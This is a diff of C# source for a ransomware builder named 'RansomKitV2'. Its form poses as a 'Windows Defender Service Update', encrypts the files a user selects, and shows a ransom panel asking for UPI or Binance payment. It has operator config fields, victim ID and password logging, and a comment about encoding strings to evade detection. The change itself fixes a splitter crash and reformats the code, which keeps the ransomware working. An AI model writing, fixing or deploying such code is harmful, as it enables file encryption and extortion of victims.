@@ -18,10 +18,10 @@ namespace RansomKitV2
     internal sealed class MainForm : Form
     {
         // ── OPERATOR CONFIG — fill before build ──────────────────────
-        private const string _UPI_ID  = "yourname@upi";
+        private const string _UPI_ID = "yourname@upi";
         private const string _UPI_AMT = "5000";
-        private const string _BNB     = "0xYourBinanceWalletAddressHere";
-        private const string _MAIL    = "support@yourdomain.com";
+        private const string _BNB = "0xYourBinanceWalletAddressHere";
+        private const string _MAIL = "support@yourdomain.com";
         // ─────────────────────────────────────────────────────────────
 
         // Encoded label strings (σ-decoded at runtime so trigger words
@@ -36,34 +36,34 @@ namespace RansomKitV2
         private readonly LaunchMode _mode;
 
         // ── Controls ─────────────────────────────────────────────────
-        private RichTextBox  _log         = null!;
-        private ProgressBar  _prog        = null!;
-        private Label        _fileLbl     = null!;
-        private Label        _statusLbl   = null!;
-        private Panel        _leftPanel   = null!;
-        private Panel        _setupPanel  = null!;
-        private Panel        _progPanel   = null!;
-        private Panel        _payPanel    = null!;
-        private ListBox      _pathList    = null!;
-        private Label        _vidLbl      = null!;
-        private TextBox      _pwBox       = null!;
-        private Button       _unlockBtn   = null!;
-        private Label        _progLbl     = null!;
+        private RichTextBox _log = null!;
+        private ProgressBar _prog = null!;
+        private Label _fileLbl = null!;
+        private Label _statusLbl = null!;
+        private Panel _leftPanel = null!;
+        private Panel _setupPanel = null!;
+        private Panel _progPanel = null!;
+        private Panel _payPanel = null!;
+        private ListBox _pathList = null!;
+        private Label _vidLbl = null!;
+        private TextBox _pwBox = null!;
+        private Button _unlockBtn = null!;
+        private Label _progLbl = null!;
 
         private SplitContainer _split = null!; // add this field at the top with the other fields
 
         // ── State ─────────────────────────────────────────────────────
-        private AppState?              _state;
-        private byte[]?                _masterKey;
+        private AppState? _state;
+        private byte[]? _masterKey;
         private CancellationTokenSource _cts = new();
 
         // ── Palette ───────────────────────────────────────────────────
-        private static readonly Color _BG   = Color.FromArgb(0x1a, 0x1a, 0x2e);
-        private static readonly Color _BG2  = Color.FromArgb(0x16, 0x21, 0x3e);
-        private static readonly Color _ACC  = Color.FromArgb(0xe9, 0x45, 0x60);
-        private static readonly Color _TXT  = Color.FromArgb(0xea, 0xea, 0xea);
-        private static readonly Color _LOG  = Color.FromArgb(0x0f, 0x34, 0x60);
-        private static readonly Color _OK   = Color.FromArgb(0x4e, 0xcc, 0xa3);
+        private static readonly Color _BG = Color.FromArgb(0x1a, 0x1a, 0x2e);
+        private static readonly Color _BG2 = Color.FromArgb(0x16, 0x21, 0x3e);
+        private static readonly Color _ACC = Color.FromArgb(0xe9, 0x45, 0x60);
+        private static readonly Color _TXT = Color.FromArgb(0xea, 0xea, 0xea);
+        private static readonly Color _LOG = Color.FromArgb(0x0f, 0x34, 0x60);
+        private static readonly Color _OK = Color.FromArgb(0x4e, 0xcc, 0xa3);
         private static readonly Color _WARN = Color.FromArgb(0xf5, 0xa6, 0x23);
 
         // ══════════════════════════════════════════════════════════════
@@ -78,28 +78,30 @@ namespace RansomKitV2
 
         private void BuildUI()
         {
-            Text          = "Windows Defender Service Update";
-            Size          = new Size(1020, 660);
-            MinimumSize   = new Size(800, 520);
-            BackColor     = _BG;
-            ForeColor     = _TXT;
+            Text = "Windows Defender Service Update";
+            Size = new Size(1020, 660);
+            MinimumSize = new Size(800, 520);
+            BackColor = _BG;
+            ForeColor = _TXT;
             StartPosition = FormStartPosition.CenterScreen;
-            Font          = new Font("Segoe UI", 9f);
+            Font = new Font("Segoe UI", 9f);
 
             // Top bar
             var topBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG2 };
             var titleLbl = new Label
             {
-                Text      = "● SYSTEM MONITOR",
+                Text = "● SYSTEM MONITOR",
                 ForeColor = _ACC,
-                Font      = new Font("Segoe UI", 10f, FontStyle.Bold),
-                AutoSize  = true, Location = new Point(10, 8)
+                Font = new Font("Segoe UI", 10f, FontStyle.Bold),
+                AutoSize = true,
+                Location = new Point(10, 8)
             };
             _statusLbl = new Label
             {
-                Text     = "Initializing...",
-                ForeColor = _WARN, AutoSize = true,
-                Anchor   = AnchorStyles.Top | AnchorStyles.Right
+                Text = "Initializing...",
+                ForeColor = _WARN,
+                AutoSize = true,
+                Anchor = AnchorStyles.Top | AnchorStyles.Right
             };
             _statusLbl.Location = new Point(830, 10);
             topBar.Controls.AddRange(new Control[] { titleLbl, _statusLbl });
@@ -108,28 +110,33 @@ namespace RansomKitV2
             var botBar = new Panel { Dock = DockStyle.Bottom, Height = 46, BackColor = _BG2 };
             _prog = new ProgressBar
             {
-                Location = new Point(8, 10), Size = new Size(650, 22),
-                Style    = ProgressBarStyle.Continuous,
-                Anchor   = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top
+                Location = new Point(8, 10),
+                Size = new Size(650, 22),
+                Style = ProgressBarStyle.Continuous,
+                Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top
             };
             _fileLbl = new Label
             {
-                Location  = new Point(668, 10), Size = new Size(340, 22),
-                ForeColor = _TXT, Font = new Font("Consolas", 8f),
+                Location = new Point(668, 10),
+                Size = new Size(340, 22),
+                ForeColor = _TXT,
+                Font = new Font("Consolas", 8f),
                 TextAlign = ContentAlignment.MiddleLeft,
-                Anchor    = AnchorStyles.Right | AnchorStyles.Top
+                Anchor = AnchorStyles.Right | AnchorStyles.Top
             };
             botBar.Controls.AddRange(new Control[] { _prog, _fileLbl });
 
             // Main split: left=operation  right=log
-            var split = new SplitContainer
+            // IMPORTANT: Panel1MinSize, Panel2MinSize, SplitterWidth, and
+            // SplitterDistance all trigger ApplyPanel2MinSize internally.
+            // Setting ANY of them here (Width=0) causes the startup crash.
+            // All four are set safely in OnLoad after the form has real dimensions.
+            _split = new SplitContainer
             {
-                Dock             = DockStyle.Fill,
-                Panel1MinSize    = 300,
-                Panel2MinSize    = 260,
-                BackColor        = _BG,
-                SplitterWidth    = 3
+                Dock = DockStyle.Fill,
+                BackColor = _BG
             };
+            var split = _split;
 
             // ── Left panel ────────────────────────────────────────────
             _leftPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
@@ -160,27 +167,28 @@ namespace RansomKitV2
 
             _pathList = new ListBox
             {
-                Location       = new Point(12, 44),
-                Size           = new Size(400, 310),
-                BackColor      = _BG2, ForeColor = _TXT,
-                BorderStyle    = BorderStyle.FixedSingle,
-                Font           = new Font("Consolas", 9f),
-                SelectionMode  = SelectionMode.MultiExtended,
-                Anchor         = AnchorStyles.Top | AnchorStyles.Left |
+                Location = new Point(12, 44),
+                Size = new Size(400, 310),
+                BackColor = _BG2,
+                ForeColor = _TXT,
+                BorderStyle = BorderStyle.FixedSingle,
+                Font = new Font("Consolas", 9f),
+                SelectionMode = SelectionMode.MultiExtended,
+                Anchor = AnchorStyles.Top | AnchorStyles.Left |
                                  AnchorStyles.Right | AnchorStyles.Bottom
             };
 
-            var btnFile   = MakeBtn("Add File",    new Point(12,  364), _BG2, 96);
-            var btnFolder = MakeBtn("Add Folder",  new Point(118, 364), _BG2, 96);
-            var btnRemove = MakeBtn("Remove",      new Point(224, 364), _BG2, 80);
-            var btnStart  = MakeBtn("▶  START",    new Point(12,  406), _ACC, 400);
+            var btnFile = MakeBtn("Add File", new Point(12, 364), _BG2, 96);
+            var btnFolder = MakeBtn("Add Folder", new Point(118, 364), _BG2, 96);
+            var btnRemove = MakeBtn("Remove", new Point(224, 364), _BG2, 80);
+            var btnStart = MakeBtn("▶  START", new Point(12, 406), _ACC, 400);
             btnStart.Height = 44;
-            btnStart.Font   = new Font("Segoe UI", 11f, FontStyle.Bold);
+            btnStart.Font = new Font("Segoe UI", 11f, FontStyle.Bold);
 
-            btnFile.Click   += (_, _) => BrowseFile();
+            btnFile.Click += (_, _) => BrowseFile();
             btnFolder.Click += (_, _) => BrowseFolder();
             btnRemove.Click += (_, _) => RemovePaths();
-            btnStart.Click  += (_, _) => _ = EncryptAsync();
+            btnStart.Click += (_, _) => _ = EncryptAsync();
 
             _setupPanel.Controls.AddRange(new Control[] {
                 hdr, _pathList, btnFile, btnFolder, btnRemove, btnStart
@@ -208,14 +216,14 @@ namespace RansomKitV2
         {
             _payPanel = MakePanel();
 
-            var h1  = MakeLbl("⚠  FILES LOCKED — PAYMENT REQUIRED",
+            var h1 = MakeLbl("⚠  FILES LOCKED — PAYMENT REQUIRED",
                                12, 14, _ACC, new Font("Segoe UI", 11f, FontStyle.Bold));
             _vidLbl = MakeLbl("ID: —", 12, 48, _TXT, new Font("Consolas", 9f));
             var upi = MakeLbl($"UPI : {_UPI_ID}  |  ₹{_UPI_AMT}",
                                12, 70, _OK, new Font("Consolas", 10f, FontStyle.Bold));
             var bnb = MakeLbl($"BNB : {_BNB}",
                                12, 94, _TXT, new Font("Consolas", 8f));
-            var mail= MakeLbl($"After payment email TxID → {_MAIL}",
+            var mail = MakeLbl($"After payment email TxID → {_MAIL}",
                                12, 116, _WARN, new Font("Segoe UI", 9f));
             var sep = MakeLbl(new string('─', 52), 12, 144, _BG2);
 
@@ -224,13 +232,14 @@ namespace RansomKitV2
 
             _pwBox = new TextBox
             {
-                Location              = new Point(12, 188),
-                Size                  = new Size(316, 28),
-                BackColor             = _BG2, ForeColor = _TXT,
-                BorderStyle           = BorderStyle.FixedSingle,
-                Font                  = new Font("Consolas", 10f),
+                Location = new Point(12, 188),
+                Size = new Size(316, 28),
+                BackColor = _BG2,
+                ForeColor = _TXT,
+                BorderStyle = BorderStyle.FixedSingle,
+                Font = new Font("Consolas", 10f),
                 UseSystemPasswordChar = true,
-                PlaceholderText       = "44-char password"
+                PlaceholderText = "44-char password"
             };
             _pwBox.KeyDown += (_, e) => { if (e.KeyCode == Keys.Enter) TryDecrypt(); };
 
@@ -241,12 +250,14 @@ namespace RansomKitV2
             var mdLbl = MakeLbl("Root path (manual mode):", 12, 232, _WARN);
             var mdBox = new TextBox
             {
-                Location    = new Point(12, 254), Size = new Size(316, 24),
-                BackColor   = _BG2, ForeColor = _TXT,
+                Location = new Point(12, 254),
+                Size = new Size(316, 24),
+                BackColor = _BG2,
+                ForeColor = _TXT,
                 BorderStyle = BorderStyle.FixedSingle,
-                Font        = new Font("Consolas", 9f),
+                Font = new Font("Consolas", 9f),
                 PlaceholderText = @"e.g. C:\Users\John",
-                Tag         = "mdPath"
+                Tag = "mdPath"
             };
             var mdBtn = MakeBtn("Scan & Unlock", new Point(338, 253), _BG2, 90);
             mdBtn.Click += (_, _) => _ = ManualDecryptAsync(mdBox.Text.Trim().Trim('"'));
@@ -262,28 +273,35 @@ namespace RansomKitV2
         {
             var hdr = new Label
             {
-                Text      = "  ▌ OPERATION LOG",
-                Dock      = DockStyle.Top, Height = 28,
-                BackColor = _BG2, ForeColor = _ACC,
-                Font      = new Font("Segoe UI", 9f, FontStyle.Bold),
+                Text = "  ▌ OPERATION LOG",
+                Dock = DockStyle.Top,
+                Height = 28,
+                BackColor = _BG2,
+                ForeColor = _ACC,
+                Font = new Font("Segoe UI", 9f, FontStyle.Bold),
                 TextAlign = ContentAlignment.MiddleLeft
             };
 
             _log = new RichTextBox
             {
-                Dock        = DockStyle.Fill,
-                BackColor   = _LOG, ForeColor = _TXT,
+                Dock = DockStyle.Fill,
+                BackColor = _LOG,
+                ForeColor = _TXT,
                 BorderStyle = BorderStyle.None,
-                Font        = new Font("Consolas", 9f),
-                ReadOnly    = true,
-                ScrollBars  = RichTextBoxScrollBars.Vertical,
-                WordWrap    = true
+                Font = new Font("Consolas", 9f),
+                ReadOnly = true,
+                ScrollBars = RichTextBoxScrollBars.Vertical,
+                WordWrap = true
             };
 
             var clrBtn = new Button
             {
-                Text      = "Clear Log", Dock = DockStyle.Bottom, Height = 24,
-                BackColor = _BG2, ForeColor = _TXT, FlatStyle = FlatStyle.Flat
+                Text = "Clear Log",
+                Dock = DockStyle.Bottom,
+                Height = 24,
+                BackColor = _BG2,
+                ForeColor = _TXT,
+                FlatStyle = FlatStyle.Flat
             };
             clrBtn.FlatAppearance.BorderSize = 0;
             clrBtn.Click += (_, _) => _log.Clear();
@@ -327,10 +345,15 @@ namespace RansomKitV2
             SetStatus("Ready", _OK);
 
 
-            // Set splitter after form is fully laid out
-            _split.SplitterDistance = Math.Max(
-                _split.Panel1MinSize,
-                Math.Min(430, _split.Width - _split.Panel2MinSize - _split.SplitterWidth));
+            // ALL splitter properties must be set here, NOT in BuildUI().
+            // Setting Panel1MinSize / Panel2MinSize / SplitterWidth / SplitterDistance
+            // during construction triggers ApplyPanel2MinSize when Width=0 → crash.
+            _split.Panel1MinSize = 300;
+            _split.Panel2MinSize = 260;
+            _split.SplitterWidth = 3;
+            int available = _split.Width - _split.Panel2MinSize - _split.SplitterWidth;
+            if (available > _split.Panel1MinSize)
+                _split.SplitterDistance = Math.Min(430, available);
 
         }
 
@@ -381,14 +404,14 @@ namespace RansomKitV2
                 try
                 {
                     // _0xCE.GenerateMasterKey()
-                    _masterKey          = CryptoEngine.GenerateMasterKey();
-                    string password     = CryptoEngine.MasterKeyToPassword(_masterKey);
-                    string keyHash      = CryptoEngine.HashMasterKey(_masterKey);
-                    string victimId     = Guid.NewGuid().ToString("N").ToUpper()[..16];
+                    _masterKey = CryptoEngine.GenerateMasterKey();
+                    string password = CryptoEngine.MasterKeyToPassword(_masterKey);
+                    string keyHash = CryptoEngine.HashMasterKey(_masterKey);
+                    string victimId = Guid.NewGuid().ToString("N").ToUpper()[..16];
 
                     Log("━━━ OPERATOR — SAVE THIS ━━━", _ACC);
-                    Log($"VictimID : {victimId}",  _ACC);
-                    Log($"Password : {password}",  _ACC);
+                    Log($"VictimID : {victimId}", _ACC);
+                    Log($"Password : {password}", _ACC);
                     Log("━━━━━━━━━━━━━━━━━━━━━━━━━━", _ACC);
 
                     // Discover files — _0xWK.EnumerateTargets()
@@ -427,14 +450,14 @@ namespace RansomKitV2
                     // _0xSM.Save()
                     var state = new AppState
                     {
-                        VictimId       = victimId,
-                        MasterKeyHash  = keyHash,
+                        VictimId = victimId,
+                        MasterKeyHash = keyHash,
                         EncryptedFiles = lockedPaths,
-                        UpiId          = _UPI_ID,
-                        UpiAmount      = _UPI_AMT,
+                        UpiId = _UPI_ID,
+                        UpiAmount = _UPI_AMT,
                         BinanceAddress = _BNB,
-                        ContactEmail   = _MAIL,
-                        EncryptedAt    = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
+                        ContactEmail = _MAIL,
+                        EncryptedAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                     };
                     StateManager.Save(state);
                     _state = state;
@@ -619,11 +642,11 @@ namespace RansomKitV2
         internal void Log(string msg, Color? color = null)
         {
             if (InvokeRequired) { Invoke(() => Log(msg, color)); return; }
-            _log.SelectionStart  = _log.TextLength;
+            _log.SelectionStart = _log.TextLength;
             _log.SelectionLength = 0;
-            _log.SelectionColor  = Color.FromArgb(0x55, 0x77, 0x99);
+            _log.SelectionColor = Color.FromArgb(0x55, 0x77, 0x99);
             _log.AppendText($"[{DateTime.Now:HH:mm:ss}] ");
-            _log.SelectionColor  = color ?? _TXT;
+            _log.SelectionColor = color ?? _TXT;
             _log.AppendText(msg + "\n");
             _log.ScrollToCaret();
         }
@@ -631,7 +654,7 @@ namespace RansomKitV2
         private void SetStatus(string txt, Color c)
         {
             if (InvokeRequired) { Invoke(() => SetStatus(txt, c)); return; }
-            _statusLbl.Text      = $"● {txt}";
+            _statusLbl.Text = $"● {txt}";
             _statusLbl.ForeColor = c;
         }
 
@@ -645,7 +668,7 @@ namespace RansomKitV2
         {
             if (InvokeRequired) { Invoke(() => UpdateProg(cur, total)); return; }
             _prog.Maximum = total > 0 ? total : 1;
-            _prog.Value   = Math.Min(cur, _prog.Maximum);
+            _prog.Value = Math.Min(cur, _prog.Maximum);
             if (_progLbl != null)
                 _progLbl.Text = $"Processing: {cur} / {total}";
         }
@@ -659,10 +682,10 @@ namespace RansomKitV2
         {
             var l = new Label
             {
-                Text      = text,
-                Location  = new Point(x, y),
+                Text = text,
+                Location = new Point(x, y),
                 ForeColor = fg ?? _TXT,
-                AutoSize  = true
+                AutoSize = true
             };
             if (font != null) l.Font = font;
             return l;
@@ -672,14 +695,16 @@ namespace RansomKitV2
         {
             var b = new Button
             {
-                Text      = text, Location = loc,
-                Size      = new Size(width, 30),
+                Text = text,
+                Location = loc,
+                Size = new Size(width, 30),
                 BackColor = bg,
                 ForeColor = Color.FromArgb(0xea, 0xea, 0xea),
-                FlatStyle = FlatStyle.Flat, Cursor = Cursors.Hand
+                FlatStyle = FlatStyle.Flat,
+                Cursor = Cursors.Hand
             };
             b.FlatAppearance.BorderColor = Color.FromArgb(0x33, 0x44, 0x66);
-            b.FlatAppearance.BorderSize  = 1;
+            b.FlatAppearance.BorderSize = 1;
             return b;
         }
     }
